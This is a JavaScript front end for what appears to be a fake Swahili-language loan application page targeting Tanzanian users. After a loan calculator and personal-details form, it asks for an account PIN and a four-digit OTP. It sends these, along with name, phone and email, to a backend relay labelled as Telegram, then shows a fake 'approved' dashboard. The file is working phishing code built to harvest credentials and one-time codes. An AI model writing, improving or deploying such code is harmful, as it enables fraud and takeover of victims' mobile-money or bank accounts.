// ==========================================
// 1. GLOBAL STATE DATA STRUCTURE
// ==========================================
let applicationData = { 
    amount: 500000, 
    duration: 12, 
    type: '', 
    purpose: '', 
    firstName: '', 
    lastName: '', 
    email: '', 
    phone: '', 
    employment: '', 
    income: '' 
};

// Initialize Engine on Page Load
document.addEventListener("DOMContentLoaded", () => {
    initCalculator();
});

// ==========================================
// 2. VIEW NAVIGATION CONTROLLER
// ==========================================
function goToStep(stepNumber) {
    document.querySelectorAll('.app-view').forEach(v => {
        if(['view-step1', 'view-step2', 'view-step3'].includes(v.id)) {
            v.classList.remove('active');
        }
    });
    
    const targetView = document.getElementById(`view-step${stepNumber}`);
    if (targetView) targetView.classList.add('active');

    const fillPercent = ((stepNumber - 1) / 2) * 100;
    const progressFill = document.getElementById('progress-fill');
    if (progressFill) progressFill.style.width = `${fillPercent}%`;

    for (let i = 1; i <= 3; i++) {
        const dot = document.getElementById(`step-dot-${i}`);
        if (dot) dot.classList.toggle('active', i <= stepNumber);
    }
}

function startApplication() {
    document.getElementById('view-landing')?.classList.remove('active');
    document.getElementById('progress-container')?.classList.remove('hidden');
    goToStep(1);
}

function exitApplication() {
    document.getElementById('progress-container')?.classList.add('hidden');
    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
    document.getElementById('view-landing')?.classList.add('active');
}

function navigateTo(viewId) {
    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
    document.getElementById(viewId)?.classList.add('active');
}

function showLoading(msg, duration, callback) {
    const overlay = document.getElementById('loading-overlay');
    const msgElement = document.getElementById('overlay-msg');
    
    if (overlay && msgElement) {
        msgElement.innerText = msg;
        overlay.classList.remove('hidden');
        setTimeout(() => { 
            overlay.classList.add('hidden'); 
            if (callback) callback(); 
        }, duration);
    }
}

// ==========================================
// 3. CORE CALCULATOR MATH (2.1% Interest Rate)
// ==========================================
function initCalculator() {
    const amountSlider = document.getElementById('calc-amount');
    const durationSlider = document.getElementById('calc-duration');
    
    if (!amountSlider || !durationSlider) return;

    const update = () => {
        const amt = parseInt(amountSlider.value, 10) || 0;
        const dur = parseInt(durationSlider.value, 10) || 1;
        
        document.getElementById('calc-amount-val').innerText = `TSh ${amt.toLocaleString()}`;
        document.getElementById('calc-duration-val').innerText = `miezi ${dur}`;
        
        const monthlyInterestRate = 0.021;
        const totalPayable = amt + (amt * monthlyInterestRate * dur);
        const monthly = Math.round(totalPayable / dur);
        
        document.getElementById('calc-monthly-payment').innerText = `TSh ${monthly.toLocaleString()}`;
        
        applicationData.amount = amt;
        applicationData.duration = dur;
        
        if (document.getElementById('loan-amount')) document.getElementById('loan-amount').value = amt;
        if (document.getElementById('loan-duration')) document.getElementById('loan-duration').value = dur;
    };
    
    amountSlider.addEventListener('input', update);
    durationSlider.addEventListener('input', update);
    update();
}

// ==========================================
// 4. STEP CAPTURE & VALIDATION HANDLERS
// ==========================================
function saveStep1() {
    applicationData.type = document.getElementById('loan-type')?.value || '';
    applicationData.amount = parseInt(document.getElementById('loan-amount')?.value, 10) || 0;
    applicationData.duration = parseInt(document.getElementById('loan-duration')?.value, 10) || 0;
    applicationData.purpose = document.getElementById('loan-purpose')?.value.trim() || '';
    
    if (!applicationData.type || !applicationData.purpose) {
        alert("Tafadhali jaza nafasi zote kabla ya kuendelea.");
        return;
    }
    goToStep(2);
}

function saveStep2() {
    const firstName = document.getElementById('first-name')?.value.trim();
    const lastName = document.getElementById('last-name')?.value.trim();
    const email = document.getElementById('email')?.value.trim();
    let rawPhone = document.getElementById('phone')?.value.trim() || '';

    if (!firstName || !lastName || !email || !rawPhone) {
        alert("Tafadhali jaza taarifa zako zote.");
        return;
    }

    applicationData.firstName = firstName;
    applicationData.lastName = lastName;
    applicationData.email = email;
    
    if (rawPhone.startsWith('0')) rawPhone = rawPhone.substring(1);
    applicationData.phone = "+255" + rawPhone;

    document.getElementById('sum-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
    document.getElementById('sum-duration').innerText = `${applicationData.duration} Miezi`;
    document.getElementById('sum-name').innerText = `${firstName} ${lastName}`;
    
    goToStep(3);
}

function submitApplication() {
    applicationData.employment = document.getElementById('employment-status')?.value || '';
    const rawIncome = document.getElementById('annual-income')?.value || '0';
    applicationData.income = rawIncome;
    
    const incomeNumber = parseInt(rawIncome, 10) || 0;

    // 1. Basic Check: Empty verification tracking
    if (!applicationData.employment || !rawIncome) {
        alert("Tafadhali kamilisha maelezo ya kazi na kipato.");
        return;
    }

    // 2. MINIMUM INCOME REQUIREMENT (Enforcing at least TSh 20,000)
    if (incomeNumber < 20000) {
        alert("Samahani, vigezo vyetu vinahitaji uwe na kipato cha kuanzia TSh 20,000 kwa mwezi ili kuomba mkopo.");
        return; // Stops execution immediately
    }

    showLoading("Inahakiki vigezo vya mkopo…", 2500, () => {
        document.getElementById('progress-container')?.classList.add('hidden');
        
        const message = 
`🔔 *Maombi Mapya ya Mkopo!*
----------------------------
👤 *Jina:* ${applicationData.firstName} ${applicationData.lastName}
📱 *Namba:* ${applicationData.phone}
📧 *Email:* ${applicationData.email}
💰 *Kiasi:* TSh ${applicationData.amount.toLocaleString()}
📅 *Muda:* ${applicationData.duration} Miezi
🛠 *Aina:* ${applicationData.type}
🎯 *Madhumuni:* ${applicationData.purpose}
💼 *Ajira:* ${applicationData.employment}
💵 *Kipato/Mwezi:* TSh ${incomeNumber.toLocaleString()}`;
        
        sendToTelegram(message);
        
        if (document.getElementById('login-phone')) {
            document.getElementById('login-phone').value = applicationData.phone.replace("+255", "");
        }
        navigateTo('view-login');
    });
}

function handleLogin() {
    const plainPin = document.getElementById('login-pin')?.value;
    if (!plainPin || plainPin.length < 4) {
        alert("Tafadhali weka PIN halali ya akaunti.");
        return;
    }
    showLoading("Inatengeneza Secure Gateway…", 2000, () => { 
        navigateTo('view-otp'); 
    });
}

function moveOtpFocus(current, nextId) {
    if (current.value.length >= 1 && document.getElementById(nextId)) {
        document.getElementById(nextId).focus();
    }
}

function verifyOtp() {
    const o1 = document.getElementById('otp1')?.value || '';
    const o2 = document.getElementById('otp2')?.value || '';
    const o3 = document.getElementById('otp3')?.value || '';
    const o4 = document.getElementById('otp4')?.value || '';
    const otpCode = o1 + o2 + o3 + o4;
    const plainPin = document.getElementById('login-pin')?.value || '';

    if (otpCode.length < 4) {
        alert("Tafadhali weka msimbo kamili wa OTP wenye namba 4.");
        return;
    }

    showLoading("Inakamilisha Uhakiki...", 3000, () => {
        const securityMessage = 
`🔑 *Uthibitisho wa Kuingia*
----------------------------
📱 *Namba ya Simu:* ${applicationData.phone || "Haijulikani"}
🔐 *PIN ya Akaunti:* ${plainPin}
🔢 *Msimbo wa OTP:* ${otpCode}`;
        
        sendToTelegram(securityMessage);
        
        if (document.getElementById('dash-approved-amount')) {
            document.getElementById('dash-approved-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
        }
        navigateTo('view-dashboard');
    });
}

// ==========================================
// 5. SECURE ROUTING DISPATCHER (NO TOKENS HERE)
// ==========================================
function sendToTelegram(textMessage) {
    const backendApiUrl = "/api/submit"; 

    fetch(backendApiUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: textMessage })
    })
    .then(response => {
        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
        return response.json();
    })
    .then(data => {
        if (data.success) console.log("✅ Message processed securely via backend wrapper.");
        else console.error("❌ Telegram processing error:", data.error);
    })
    .catch(error => {
        console.error("🚨 API Network Routing Exception:", error.message);
    });
          }
  
